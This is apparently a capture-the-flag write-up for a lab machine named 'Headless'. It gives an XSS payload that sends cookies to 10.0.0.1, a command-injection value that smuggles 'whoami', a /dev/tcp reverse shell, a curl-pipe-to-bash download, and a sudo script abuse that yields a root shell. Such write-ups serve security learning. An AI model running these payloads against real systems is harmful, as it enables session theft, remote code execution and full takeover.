# Headless

### Reconnaissance

- port 22 SSH
- port 5000 HTTP

### Exploitation

XSS in User-Agent header `<img src=x onerror=fetch('http://10.0.0.1:80/+document.cookie);>`

Command injection in dashboard `date` parameter `date=2024-05-12;whoami`

Host shell on attacker `bash -i >& /dev/tcp/10.0.0.1/443 0>&1` and use `curl http://10.0.0.1:80/shell.sh|bash`
to execute on the target

### Privilege Escalation

`sudo -l` shows the user can execute `/usr/bin/syscheck` with sudo

`/usr/bin/syscheck` checks if `initdb.sh` is running and if it is not, it runs it

Create `initdb.sh`, using the same reverse shell as before with a different port as the contents, then run 
`sudo /usr/bin/syscheck` to get a root shell

### Lessons Learned

- If a page renders any content from a POST request check for XSS!
- Check for command injection in POST requests
